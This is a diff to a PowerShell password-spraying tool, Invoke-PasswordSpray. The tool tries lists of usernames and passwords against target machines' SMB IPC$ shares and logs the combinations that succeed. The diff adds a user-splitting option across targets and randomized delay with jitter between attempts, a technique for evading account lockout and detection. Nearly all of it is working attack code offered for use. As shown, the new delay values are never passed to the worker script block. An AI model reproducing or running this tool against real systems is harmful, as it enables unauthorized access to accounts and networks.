@@ -2,11 +2,17 @@
   .SYNOPSIS
     Execute a password spraying attack.
   .PARAMETER Targets
-    Specify a target, comma delimited targets, a local targets file, or an online comma delimited targets string.
+    Target, comma delimited targets, a local targets file, or an online comma delimited targets string.
   .PARAMETER Users
-    Specify a user, comma delimited users, a local users file, or an online comma delimited users string.
+    User, comma delimited users, a local users file, or an online comma delimited users string.
   .PARAMETER Passwords
-    Specify a password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string.
+    Password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string.
+  .PARAMETER Split
+    Split up requests between each target.
+  .PARAMETER Delay
+    A delay between each authentication attempt, in seconds.
+  .PARAMETER Jitter
+    Increase the range of randomness in the delay.
   .NOTES
     Author: Luke Baggett
     Date: August 6, 2014
@@ -16,7 +22,10 @@ function Invoke-PasswordSpray
   param(
     [Parameter(Mandatory=$True)]$Targets,
     [Parameter(Mandatory=$True)]$Users,
-    [Parameter(Mandatory=$True)]$Passwords
+    [Parameter(Mandatory=$True)]$Passwords,
+    [switch]$Split=$False,
+    [double]$Jitter = 0.20,
+    [double]$Delay = 0.00
   )
 
   $Parameters = @("Targets","Users","Passwords")
@@ -37,13 +46,17 @@ function Invoke-PasswordSpray
     param(
       $Target,
       $Users,
-      $Passwords
+      $Passwords,
+      $Jitter,
+      $Delay
     )
     $Result=@()
+    $Random = New-Object System.Random
     foreach($User in $Users)
     {
       foreach($Password in $Passwords)
       {
+        Start-Sleep $Random.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         if((New-SmbMapping -RemotePath \\$Target\IPC$ -UserName $User -Password $Password 2>&1).Status -eq "OK")
         {
           $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
@@ -54,10 +67,30 @@ function Invoke-PasswordSpray
     return $Result
   }
 
+  if($Split)
+  {
+    $SplitUsers=@{}
+    $Base = 0
+    $TargetCounter = -1
+    $ChunkSize = [int]($Users.Count/$Targets.Count)
+    while($Base -lt $Users.Count)
+    {
+      $TargetCounter += 1
+      if(($Base + $ChunkSize) -gt $Users.Count)
+      {
+        $SplitUsers[$TargetCounter] = $Users[$Base..($Users.Count-1)]
+        break
+      }
+      $SplitUsers[$TargetCounter] = $Users[$Base..($Base+$Chunksize-1)]
+      $Base+=$ChunkSize
+    }
+  }
+
   Write-Host ((Get-Date -Format [hh:mm:ss]) + " Starting Attack... ")
   foreach($Target in $Targets)
   {
-    $Arguments = @($Target,$Users,$Passwords)
+    if($Split){$Arguments = @($Target,$SplitUsers[$Targets.IndexOf($Target)],$Passwords)}
+    else{$Arguments = @($Target,$Users,$Passwords)}
     $Jobs += (Start-Job $ScriptBlock -ArgumentList $Arguments).Name
   }
 
